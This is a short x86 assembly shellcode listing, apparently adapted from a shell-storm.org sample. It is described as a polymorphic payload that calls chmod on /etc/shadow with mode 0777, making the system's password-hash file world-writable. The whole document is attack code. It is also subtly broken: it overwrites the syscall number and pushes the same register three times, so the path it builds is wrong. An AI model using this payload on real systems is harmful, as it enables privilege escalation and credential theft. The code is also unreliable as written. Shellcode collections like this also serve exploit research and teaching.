;http://shell-storm.org/shellcode/files/shellcode-590.php
;Name: 33 bytes chmod("/etc/shadow", 0777) shellcode
;Little bit of polymorphism applied by me

section .text

	xor eax,eax
	push eax
	mov al,0xf
	mov dword edx,0x776f6461
	push edx
	mov dword eax,0x68732f63
	push edx
	mov dword eax,0x74652f2f
	push edx
	mov ebx,esp
	xor ecx,ecx
	xor edx,edx
	mov cx,0x1ff
	int 0x80
	inc eax
	int 0x80
